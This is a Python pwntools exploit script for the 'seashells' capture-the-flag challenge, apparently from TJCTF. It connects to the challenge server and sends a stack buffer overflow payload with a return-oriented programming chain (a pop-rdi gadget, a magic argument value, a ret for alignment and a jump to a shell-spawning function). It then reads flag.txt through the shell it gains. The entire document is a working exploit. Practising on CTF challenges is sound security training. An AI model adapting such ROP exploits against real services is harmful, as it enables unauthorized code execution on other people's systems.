#!/usr/bin/env python3

from pwn import *


r = process('./d46850d6dd80f2b1132c9fe908e53f71e1a0a2f712ba193c29056ba1797afb4b_seashells')
r = remote('p1.tjctf.org', 8009)
context.arch = 'amd64'

r.recvuntil("Welcome to Sally's Seashore Shell Shop\n")
r.recvuntil('Would you like a shell?\n')

ret = 0x40057e
pop_rdi = 0x400803
condition = 0xdeadcafebabebeef
shell = 0x4006c7

payload  = b'yes\0'.ljust(0xa, b'\0') + b'b'*0x8
payload += flat([pop_rdi, condition, ret, shell])

r.sendline(payload)
r.sendline('cat flag.txt')

r.interactive()
